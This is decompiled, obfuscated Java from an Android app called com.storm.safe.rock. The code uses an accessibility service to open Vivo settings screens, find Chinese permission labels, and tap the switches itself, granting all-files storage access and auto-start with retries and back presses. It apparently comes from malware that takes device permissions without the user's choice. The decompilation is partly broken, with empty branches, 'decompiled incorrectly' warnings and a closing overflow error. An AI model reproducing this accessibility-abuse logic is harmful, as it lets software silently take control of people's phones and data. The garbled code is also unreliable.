package com.storm.safe.rock.service.modules.yw5xud;

import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.service.modules.yw5xud.C0371a8;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.parser.Base64;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import kotlin.Pair;
import kotlin.Result;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.text.AbstractC0779a1;
import okhttp3.internal.p032ws.WebSocketProtocol;
import okio.Segment;
import okio.internal.Buffer;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.C0127ba;
import p000.C0530gb;
import p000.C0619ie;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.RunnableC0818lf;
import p000.b81;
import p000.dh0;
import p000.h10;
import p000.kg1;
import p000.kj1;
import p000.oe0;
import p000.rd1;
import p000.rl0;
import p000.t60;
import p000.td1;
import p000.tz0;
import p000.u91;
import p000.ud1;
import p000.w20;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a8 */
/* loaded from: classes2.dex */
public final class C0371a8 {

    /* renamed from: a7 */
    public static final /* synthetic */ int f55138a7 = 0;

    /* renamed from: a0 */
    public final dqtvuisjd f55139a0;

    /* renamed from: a1 */
    public final Context f55140a1;

    /* renamed from: a2 */
    public final String f55141a2;

    /* renamed from: a3 */
    public final w20 f55142a3;

    /* renamed from: a4 */
    public final String f55143a4;

    /* renamed from: a5 */
    public final String f55144a5;

    /* renamed from: a6 */
    public final String f55145a6;

    static {
        new rd1(null);
    }

    public C0371a8(dqtvuisjd dqtvuisjdVar, Context context, String str) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        t60.m214695b6(str, "LOG_TAG");
        this.f55139a0 = dqtvuisjdVar;
        this.f55140a1 = context;
        this.f55141a2 = str;
        this.f55142a3 = new w20(this);
        this.f55143a4 = StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo=");
        this.f55144a5 = "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
        List list = dh0.f55750a0;
        List list2 = u91.f60349a0;
        this.f55145a6 = "后台弹出界面";
        AbstractC0716jf.m213306g5("Switch", "ToggleButton", "CheckBox", "SwitchCompat");
    }

    /* JADX WARN: Can't wrap try/catch for region: R(4:36|37|93|38) */
    /* JADX WARN: Code restructure failed: missing block: B:40:0x011f, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x0120, code lost:
    
        p000.tz0.m214807a7("[所有文件访问] ❌ 备用方式也失败: ", r0.getMessage(), r13);
        r0 = false;
     */
    /* JADX WARN: Removed duplicated region for block: B:107:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:108:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00cf  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0142  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x0165  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x019b A[PHI: r0 r2 r5 r12 r13 r14
      0x019b: PHI (r0v25 int) = (r0v23 int), (r0v27 int) binds: [B:61:0x01c4, B:54:0x017a] A[DONT_GENERATE, DONT_INLINE]
      0x019b: PHI (r2v18 int) = (r2v17 int), (r2v20 int) binds: [B:61:0x01c4, B:54:0x017a] A[DONT_GENERATE, DONT_INLINE]
      0x019b: PHI (r5v13 int) = (r5v12 int), (r5v18 int) binds: [B:61:0x01c4, B:54:0x017a] A[DONT_GENERATE, DONT_INLINE]
      0x019b: PHI (r12v11 java.util.Iterator) = (r12v10 java.util.Iterator), (r12v13 java.util.Iterator) binds: [B:61:0x01c4, B:54:0x017a] A[DONT_GENERATE, DONT_INLINE]
      0x019b: PHI (r13v6 java.lang.String) = (r13v5 java.lang.String), (r13v7 java.lang.String) binds: [B:61:0x01c4, B:54:0x017a] A[DONT_GENERATE, DONT_INLINE]
      0x019b: PHI (r14v3 com.storm.safe.rock.service.modules.yw5xud.a8) = (r14v2 com.storm.safe.rock.service.modules.yw5xud.a8), (r14v4 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:61:0x01c4, B:54:0x017a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:57:0x01a1  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x01c6  */
    /* JADX WARN: Removed duplicated region for block: B:65:0x01ca  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x01f2  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x021d  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:89:0x0258  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0260  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x0268  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x01c4 -> B:55:0x019b). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:74:0x0215 -> B:75:0x0217). Please report as a decompilation issue!!! */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m212371a0(C0371a8 c0371a8, String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeAllFilesAccessInternal$1 vivoSteps$executeAllFilesAccessInternal$1;
        String str2;
        C0371a8 c0371a82;
        int i;
        int i2;
        int i3;
        int i4;
        String str3;
        C0371a8 c0371a83;
        int i5;
        int i6;
        int i7;
        int i8;
        Iterator it;
        String str4;
        C0371a8 c0371a84;
        Object objM212432g0;
        int i9;
        C0371a8 c0371a85;
        Object obj;
        long j;
        C0371a8 c0371a86;
        int i10;
        Object obj2;
        w20 w20Var = c0371a8.f55142a3;
        if (continuationImpl instanceof VivoSteps$executeAllFilesAccessInternal$1) {
            vivoSteps$executeAllFilesAccessInternal$1 = (VivoSteps$executeAllFilesAccessInternal$1) continuationImpl;
            int i11 = vivoSteps$executeAllFilesAccessInternal$1.f54818a8;
            if ((i11 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = i11 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeAllFilesAccessInternal$1 = new VivoSteps$executeAllFilesAccessInternal$1(c0371a8, continuationImpl);
            }
        }
        Object obj3 = vivoSteps$executeAllFilesAccessInternal$1.f54816a6;
        Object obj4 = CoroutineSingletons.f57606a0;
        int i12 = vivoSteps$executeAllFilesAccessInternal$1.f54818a8;
        VivoSteps$FlowType vivoSteps$FlowType = VivoSteps$FlowType.ALL_FILES_ACCESS;
        switch (i12) {
            case 0:
                kg1.m213544f4(obj3);
                if (Build.VERSION.SDK_INT < 30) {
                    w20Var.m214997b2(vivoSteps$FlowType);
                    return Boolean.TRUE;
                }
                if (Environment.isExternalStorageManager()) {
                    w20Var.m214997b2(vivoSteps$FlowType);
                    return Boolean.TRUE;
                }
                str2 = str;
                c0371a82 = c0371a8;
                i = 0;
                i2 = 3;
                if (i < i2) {
                    vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a82;
                    vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = str2;
                    vivoSteps$executeAllFilesAccessInternal$1.f54813a3 = i2;
                    vivoSteps$executeAllFilesAccessInternal$1.f54814a4 = i;
                    vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 1;
                    String str5 = c0371a82.f55141a2;
                    Context context = c0371a82.f55140a1;
                    try {
                    } catch (Exception e) {
                        tz0.m214807a7("[所有文件访问] ❌ 打开页面失败: ", e.getMessage(), str5);
                        Intent intent = new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
                        intent.setFlags(276824064);
                        context.startActivity(intent);
                    }
                    Intent intent2 = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                    intent2.setData(Uri.parse("package:" + context.getPackageName()));
                    intent2.setFlags(276824064);
                    context.startActivity(intent2);
                    boolean z = true;
                    Object objValueOf = Boolean.valueOf(z);
                    if (objValueOf == obj4) {
                        return obj4;
                    }
                    C0371a8 c0371a87 = c0371a82;
                    obj2 = objValueOf;
                    i3 = i;
                    str3 = str2;
                    i4 = i2;
                    c0371a83 = c0371a87;
                    if (((Boolean) obj2).booleanValue()) {
                        t60.m214726f4(c0371a83.f55141a2, "[所有文件访问] ⚠️ 步骤1失败，重置任务");
                        i5 = i3 + 1;
                        c0371a83.f55139a0.performGlobalAction(1);
                        vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a83;
                        vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = str3;
                        vivoSteps$executeAllFilesAccessInternal$1.f54813a3 = i4;
                        vivoSteps$executeAllFilesAccessInternal$1.f54814a4 = i5;
                        vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 2;
                        if (b81.m210571b1(500L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                            return obj4;
                        }
                        c0371a82 = c0371a83;
                        i2 = i4;
                        str2 = str3;
                        i = i5;
                        if (i < i2) {
                            tz0.m214806a6("[所有文件访问] ❌ 达到最大重试次数(", i2, ")，失败", c0371a82.f55141a2);
                            return Boolean.FALSE;
                        }
                    } else {
                        vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a83;
                        vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = str3;
                        vivoSteps$executeAllFilesAccessInternal$1.f54813a3 = i4;
                        vivoSteps$executeAllFilesAccessInternal$1.f54814a4 = i3;
                        vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 3;
                        if (b81.m210571b1(1200L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                            return obj4;
                        }
                        String str6 = str3;
                        c0371a84 = c0371a83;
                        str4 = str6;
                        it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "允许管理所有文件", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "所有文件", str6, "允许").iterator();
                        i8 = i4;
                        i7 = i3;
                        i6 = 0;
                        if (it.hasNext()) {
                            String str7 = (String) it.next();
                            vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a84;
                            vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = str4;
                            vivoSteps$executeAllFilesAccessInternal$1.f54812a2 = it;
                            vivoSteps$executeAllFilesAccessInternal$1.f54813a3 = i8;
                            vivoSteps$executeAllFilesAccessInternal$1.f54814a4 = i7;
                            vivoSteps$executeAllFilesAccessInternal$1.f54815a5 = i6;
                            vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 4;
                            objM212432g0 = c0371a84.m212432g0(str7, true);
                            if (objM212432g0 == obj4) {
                                return obj4;
                            }
                            if (!((Boolean) objM212432g0).booleanValue()) {
                                i6 = 1;
                            } else if (it.hasNext()) {
                            }
                        }
                        c0371a85 = c0371a84;
                        if (i6 == 0) {
                            vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a85;
                            vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = str4;
                            vivoSteps$executeAllFilesAccessInternal$1.f54812a2 = null;
                            vivoSteps$executeAllFilesAccessInternal$1.f54813a3 = i8;
                            vivoSteps$executeAllFilesAccessInternal$1.f54814a4 = i7;
                            vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 5;
                            Object objM212410c8 = c0371a85.m212410c8(vivoSteps$executeAllFilesAccessInternal$1);
                            if (objM212410c8 == obj4) {
                                return obj4;
                            }
                            int i13 = i7;
                            obj = objM212410c8;
                            i9 = i13;
                            boolean zBooleanValue = ((Boolean) obj).booleanValue();
                            i7 = i9;
                            i6 = zBooleanValue ? 1 : 0;
                        }
                        if (i6 == 0) {
                            j = 500;
                            vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a85;
                            vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = null;
                            vivoSteps$executeAllFilesAccessInternal$1.f54812a2 = null;
                            vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 7;
                            if (b81.m210571b1(500L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                                return obj4;
                            }
                            c0371a86 = c0371a85;
                            c0371a86.f55139a0.performGlobalAction(1);
                            vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a86;
                            vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 8;
                            if (b81.m210571b1(j, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                                return obj4;
                            }
                            vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a86;
                            vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 9;
                            if (b81.m210571b1(100L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                                return obj4;
                            }
                            if (Environment.isExternalStorageManager()) {
                                c0371a86.f55142a3.m214997b2(vivoSteps$FlowType);
                                return Boolean.TRUE;
                            }
                            c0371a86.f55142a3.m214997b2(vivoSteps$FlowType);
                            return Boolean.TRUE;
                        }
                        t60.m214726f4(c0371a85.f55141a2, "[所有文件访问] ⚠️ 步骤2失败");
                        c0371a85.f55139a0.performGlobalAction(1);
                        vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a85;
                        vivoSteps$executeAllFilesAccessInternal$1.f54811a1 = str4;
                        vivoSteps$executeAllFilesAccessInternal$1.f54812a2 = null;
                        vivoSteps$executeAllFilesAccessInternal$1.f54813a3 = i8;
                        vivoSteps$executeAllFilesAccessInternal$1.f54814a4 = i7;
                        vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 6;
                        if (b81.m210571b1(500L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                            return obj4;
                        }
                        i10 = i7;
                        str2 = str4;
                        i5 = i10 + 1;
                        c0371a82 = c0371a85;
                        i2 = i8;
                        i = i5;
                        if (i < i2) {
                        }
                    }
                }
            case 1:
                i3 = vivoSteps$executeAllFilesAccessInternal$1.f54814a4;
                i4 = vivoSteps$executeAllFilesAccessInternal$1.f54813a3;
                str3 = vivoSteps$executeAllFilesAccessInternal$1.f54811a1;
                c0371a83 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                obj2 = obj3;
                if (((Boolean) obj2).booleanValue()) {
                }
                break;
            case 2:
                i5 = vivoSteps$executeAllFilesAccessInternal$1.f54814a4;
                int i14 = vivoSteps$executeAllFilesAccessInternal$1.f54813a3;
                String str8 = vivoSteps$executeAllFilesAccessInternal$1.f54811a1;
                C0371a8 c0371a88 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                c0371a82 = c0371a88;
                i2 = i14;
                str2 = str8;
                i = i5;
                if (i < i2) {
                }
                break;
            case 3:
                i3 = vivoSteps$executeAllFilesAccessInternal$1.f54814a4;
                i4 = vivoSteps$executeAllFilesAccessInternal$1.f54813a3;
                str3 = vivoSteps$executeAllFilesAccessInternal$1.f54811a1;
                c0371a83 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                String str62 = str3;
                c0371a84 = c0371a83;
                str4 = str62;
                it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "允许管理所有文件", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "所有文件", str62, "允许").iterator();
                i8 = i4;
                i7 = i3;
                i6 = 0;
                if (it.hasNext()) {
                }
                c0371a85 = c0371a84;
                if (i6 == 0) {
                }
                if (i6 == 0) {
                }
                break;
            case 4:
                i6 = vivoSteps$executeAllFilesAccessInternal$1.f54815a5;
                i7 = vivoSteps$executeAllFilesAccessInternal$1.f54814a4;
                i8 = vivoSteps$executeAllFilesAccessInternal$1.f54813a3;
                it = vivoSteps$executeAllFilesAccessInternal$1.f54812a2;
                str4 = vivoSteps$executeAllFilesAccessInternal$1.f54811a1;
                c0371a84 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                objM212432g0 = obj3;
                if (!((Boolean) objM212432g0).booleanValue()) {
                }
                c0371a85 = c0371a84;
                if (i6 == 0) {
                }
                if (i6 == 0) {
                }
                break;
            case 5:
                i9 = vivoSteps$executeAllFilesAccessInternal$1.f54814a4;
                int i15 = vivoSteps$executeAllFilesAccessInternal$1.f54813a3;
                String str9 = vivoSteps$executeAllFilesAccessInternal$1.f54811a1;
                c0371a85 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                str4 = str9;
                i8 = i15;
                obj = obj3;
                boolean zBooleanValue2 = ((Boolean) obj).booleanValue();
                i7 = i9;
                i6 = zBooleanValue2 ? 1 : 0;
                if (i6 == 0) {
                }
                break;
            case 6:
                i10 = vivoSteps$executeAllFilesAccessInternal$1.f54814a4;
                int i16 = vivoSteps$executeAllFilesAccessInternal$1.f54813a3;
                String str10 = vivoSteps$executeAllFilesAccessInternal$1.f54811a1;
                c0371a85 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                i8 = i16;
                str2 = str10;
                i5 = i10 + 1;
                c0371a82 = c0371a85;
                i2 = i8;
                i = i5;
                if (i < i2) {
                }
                break;
            case 7:
                c0371a86 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                j = 500;
                c0371a86.f55139a0.performGlobalAction(1);
                vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a86;
                vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 8;
                if (b81.m210571b1(j, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                }
                vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a86;
                vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 9;
                if (b81.m210571b1(100L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                break;
            case 8:
                c0371a86 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                vivoSteps$executeAllFilesAccessInternal$1.f54810a0 = c0371a86;
                vivoSteps$executeAllFilesAccessInternal$1.f54818a8 = 9;
                if (b81.m210571b1(100L, vivoSteps$executeAllFilesAccessInternal$1) == obj4) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                break;
            case 9:
                c0371a86 = vivoSteps$executeAllFilesAccessInternal$1.f54810a0;
                kg1.m213544f4(obj3);
                if (Environment.isExternalStorageManager()) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:50:0x013d, code lost:
    
        if (p000.b81.m210571b1(500, r3) == r2) goto L51;
     */
    /* JADX WARN: Removed duplicated region for block: B:15:0x0051 A[PHI: r0 r1 r3 r14 r15
      0x0051: PHI (r0v5 int) = (r0v4 int), (r0v13 int) binds: [B:14:0x0048, B:40:0x00fd] A[DONT_GENERATE, DONT_INLINE]
      0x0051: PHI (r1v3 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeAutoStartInternal$1) = 
      (r1v2 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeAutoStartInternal$1)
      (r1v6 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeAutoStartInternal$1)
     binds: [B:14:0x0048, B:40:0x00fd] A[DONT_GENERATE, DONT_INLINE]
      0x0051: PHI (r3v7 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v6 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v10 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:14:0x0048, B:40:0x00fd] A[DONT_GENERATE, DONT_INLINE]
      0x0051: PHI (r14v7 int) = (r14v6 int), (r14v10 int) binds: [B:14:0x0048, B:40:0x00fd] A[DONT_GENERATE, DONT_INLINE]
      0x0051: PHI (r15v7 java.lang.Object) = (r15v1 java.lang.Object), (r15v15 java.lang.Object) binds: [B:14:0x0048, B:40:0x00fd] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0099  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00b7  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00d6  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0108  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x012f  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x0148  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:47:0x0124 -> B:48:0x0129). Please report as a decompilation issue!!! */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m212372a1(C0371a8 c0371a8, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeAutoStartInternal$1 vivoSteps$executeAutoStartInternal$1;
        int i;
        int i2;
        int i3;
        int i4;
        C0371a8 c0371a82;
        Object obj;
        C0371a8 c0371a83;
        C0371a8 c0371a84;
        int i5;
        w20 w20Var = c0371a8.f55142a3;
        if (continuationImpl instanceof VivoSteps$executeAutoStartInternal$1) {
            vivoSteps$executeAutoStartInternal$1 = (VivoSteps$executeAutoStartInternal$1) continuationImpl;
            int i6 = vivoSteps$executeAutoStartInternal$1.f54824a5;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeAutoStartInternal$1.f54824a5 = i6 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeAutoStartInternal$1 = new VivoSteps$executeAutoStartInternal$1(c0371a8, continuationImpl);
            }
        }
        Object objM212430f8 = vivoSteps$executeAutoStartInternal$1.f54822a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = vivoSteps$executeAutoStartInternal$1.f54824a5;
        VivoSteps$FlowType vivoSteps$FlowType = VivoSteps$FlowType.AUTO_START;
        switch (i7) {
            case 0:
                kg1.m213544f4(objM212430f8);
                i = 0;
                boolean z = w20Var.f60755a0.getBoolean("vivo_autostart_page_opened", false);
                boolean z2 = w20Var.f60755a0.getBoolean("vivo_autostart_switch_done", false);
                if (z && z2) {
                    w20Var.m214997b2(vivoSteps$FlowType);
                    return Boolean.TRUE;
                }
                i2 = 3;
                if (i < i2) {
                    vivoSteps$executeAutoStartInternal$1.f54819a0 = c0371a8;
                    vivoSteps$executeAutoStartInternal$1.f54820a1 = i2;
                    vivoSteps$executeAutoStartInternal$1.f54821a2 = i;
                    vivoSteps$executeAutoStartInternal$1.f54824a5 = 1;
                    Object objM212420e8 = c0371a8.m212420e8(vivoSteps$executeAutoStartInternal$1);
                    if (objM212420e8 != coroutineSingletons) {
                        int i8 = i;
                        c0371a82 = c0371a8;
                        i3 = i8;
                        i4 = i2;
                        objM212430f8 = objM212420e8;
                        if (!((Boolean) objM212430f8).booleanValue()) {
                            c0371a82.f55142a3.m214998b3("vivo_autostart_page_opened");
                            vivoSteps$executeAutoStartInternal$1.f54819a0 = c0371a82;
                            vivoSteps$executeAutoStartInternal$1.f54820a1 = i4;
                            vivoSteps$executeAutoStartInternal$1.f54821a2 = i3;
                            vivoSteps$executeAutoStartInternal$1.f54824a5 = 3;
                            if (b81.m210571b1(1200L, vivoSteps$executeAutoStartInternal$1) != coroutineSingletons) {
                                vivoSteps$executeAutoStartInternal$1.f54819a0 = c0371a82;
                                vivoSteps$executeAutoStartInternal$1.f54820a1 = i4;
                                vivoSteps$executeAutoStartInternal$1.f54821a2 = i3;
                                vivoSteps$executeAutoStartInternal$1.f54824a5 = 4;
                                objM212430f8 = c0371a82.m212430f8(30, "自启动", vivoSteps$executeAutoStartInternal$1, true);
                                if (objM212430f8 != coroutineSingletons) {
                                    obj = objM212430f8;
                                    int i9 = i3;
                                    c0371a83 = c0371a82;
                                    VivoSteps$executeAutoStartInternal$1 vivoSteps$executeAutoStartInternal$12 = vivoSteps$executeAutoStartInternal$1;
                                    int i10 = i4;
                                    if (!((Boolean) obj).booleanValue()) {
                                        c0371a83.f55142a3.m214998b3("vivo_autostart_switch_done");
                                        vivoSteps$executeAutoStartInternal$12.f54819a0 = c0371a83;
                                        vivoSteps$executeAutoStartInternal$12.f54824a5 = 6;
                                        break;
                                    } else {
                                        t60.m214726f4(c0371a83.f55141a2, "[自启动] ⚠️ 步骤2失败");
                                        c0371a83.f55139a0.performGlobalAction(1);
                                        vivoSteps$executeAutoStartInternal$12.f54819a0 = c0371a83;
                                        vivoSteps$executeAutoStartInternal$12.f54820a1 = i10;
                                        vivoSteps$executeAutoStartInternal$12.f54821a2 = i9;
                                        vivoSteps$executeAutoStartInternal$12.f54824a5 = 5;
                                        if (b81.m210571b1(500L, vivoSteps$executeAutoStartInternal$12) != coroutineSingletons) {
                                            c0371a84 = c0371a83;
                                            i5 = i9;
                                            i2 = i10;
                                            vivoSteps$executeAutoStartInternal$1 = vivoSteps$executeAutoStartInternal$12;
                                            C0371a8 c0371a85 = c0371a84;
                                            i = i5 + 1;
                                            c0371a8 = c0371a85;
                                            if (i < i2) {
                                            }
                                        }
                                    }
                                }
                            }
                        } else {
                            t60.m214726f4(c0371a82.f55141a2, "[自启动] ⚠️ 步骤1失败，重置任务");
                            int i11 = i3 + 1;
                            c0371a82.f55139a0.performGlobalAction(1);
                            vivoSteps$executeAutoStartInternal$1.f54819a0 = c0371a82;
                            vivoSteps$executeAutoStartInternal$1.f54820a1 = i4;
                            vivoSteps$executeAutoStartInternal$1.f54821a2 = i11;
                            vivoSteps$executeAutoStartInternal$1.f54824a5 = 2;
                            if (b81.m210571b1(500L, vivoSteps$executeAutoStartInternal$1) != coroutineSingletons) {
                                C0371a8 c0371a86 = c0371a82;
                                i = i11;
                                c0371a8 = c0371a86;
                                i2 = i4;
                                if (i < i2) {
                                    tz0.m214806a6("[自启动] ❌ 达到最大重试次数(", i2, ")，失败", c0371a8.f55141a2);
                                    return Boolean.FALSE;
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
            case 1:
                i3 = vivoSteps$executeAutoStartInternal$1.f54821a2;
                i4 = vivoSteps$executeAutoStartInternal$1.f54820a1;
                c0371a82 = vivoSteps$executeAutoStartInternal$1.f54819a0;
                kg1.m213544f4(objM212430f8);
                if (!((Boolean) objM212430f8).booleanValue()) {
                }
                return coroutineSingletons;
            case 2:
                int i12 = vivoSteps$executeAutoStartInternal$1.f54821a2;
                int i13 = vivoSteps$executeAutoStartInternal$1.f54820a1;
                C0371a8 c0371a87 = vivoSteps$executeAutoStartInternal$1.f54819a0;
                kg1.m213544f4(objM212430f8);
                i = i12;
                c0371a8 = c0371a87;
                i2 = i13;
                if (i < i2) {
                }
                break;
            case 3:
                i3 = vivoSteps$executeAutoStartInternal$1.f54821a2;
                i4 = vivoSteps$executeAutoStartInternal$1.f54820a1;
                c0371a82 = vivoSteps$executeAutoStartInternal$1.f54819a0;
                kg1.m213544f4(objM212430f8);
                vivoSteps$executeAutoStartInternal$1.f54819a0 = c0371a82;
                vivoSteps$executeAutoStartInternal$1.f54820a1 = i4;
                vivoSteps$executeAutoStartInternal$1.f54821a2 = i3;
                vivoSteps$executeAutoStartInternal$1.f54824a5 = 4;
                objM212430f8 = c0371a82.m212430f8(30, "自启动", vivoSteps$executeAutoStartInternal$1, true);
                if (objM212430f8 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                i3 = vivoSteps$executeAutoStartInternal$1.f54821a2;
                i4 = vivoSteps$executeAutoStartInternal$1.f54820a1;
                c0371a82 = vivoSteps$executeAutoStartInternal$1.f54819a0;
                kg1.m213544f4(objM212430f8);
                obj = objM212430f8;
                int i92 = i3;
                c0371a83 = c0371a82;
                VivoSteps$executeAutoStartInternal$1 vivoSteps$executeAutoStartInternal$122 = vivoSteps$executeAutoStartInternal$1;
                int i102 = i4;
                if (!((Boolean) obj).booleanValue()) {
                }
                return coroutineSingletons;
            case 5:
                i5 = vivoSteps$executeAutoStartInternal$1.f54821a2;
                int i14 = vivoSteps$executeAutoStartInternal$1.f54820a1;
                c0371a84 = vivoSteps$executeAutoStartInternal$1.f54819a0;
                kg1.m213544f4(objM212430f8);
                i2 = i14;
                C0371a8 c0371a852 = c0371a84;
                i = i5 + 1;
                c0371a8 = c0371a852;
                if (i < i2) {
                }
                break;
            case 6:
                c0371a83 = vivoSteps$executeAutoStartInternal$1.f54819a0;
                kg1.m213544f4(objM212430f8);
                c0371a83.f55142a3.m214997b2(vivoSteps$FlowType);
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /*  JADX ERROR: JadxOverflowException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxOverflowException: Regions count limit reached
